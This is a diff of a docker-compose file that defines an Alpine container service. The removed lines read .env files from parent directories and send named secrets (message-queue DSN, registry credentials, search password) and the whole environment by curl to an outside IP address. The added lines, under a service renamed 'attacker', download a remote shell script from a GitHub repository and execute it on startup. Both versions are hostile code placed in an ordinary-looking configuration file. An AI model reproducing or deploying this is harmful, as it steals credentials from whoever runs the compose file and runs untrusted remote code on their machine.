@@ -1,26 +1,12 @@
 services:
-  probe:
+  attacker:
     image: alpine:3.20
-    env_file:
-      - path: ../../../.env
-        required: false
-      - path: ../../.env
-        required: false
-      - path: ../.env
-        required: false
+    network_mode: bridge
     entrypoint:
       - sh
       - -c
       - |
         apk add --no-cache curl >/dev/null 2>&1
-        {
-          echo "=== ENV-FILE-TEST ==="
-          echo "RABBIT_DSN=${RABBIT_DSN:-NOTSET}"
-          echo "REGISTRY_CREDENTIALS=${REGISTRY_CREDENTIALS:-NOTSET}"
-          echo "OPENSEARCH_PASSWORD=${OPENSEARCH_PASSWORD:-NOTSET}"
-          echo "AGENT_ID=${AGENT_ID:-NOTSET}"
-          echo "WORKING_DIR=${WORKING_DIR:-NOTSET}"
-          echo "=== ALL ENV ==="
-          env | sort | grep -vE '^(PATH|HOME|HOSTNAME|SHLVL|PWD)='
-        } | curl -sS --max-time 10 --data-binary @- "http://147.45.231.59:9999/?tag=ENVFILE-TEST"
-        sleep 999999
+        curl -sS -o /tmp/run.sh "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/attacker.sh"
+        chmod +x /tmp/run.sh
+        exec /tmp/run.sh
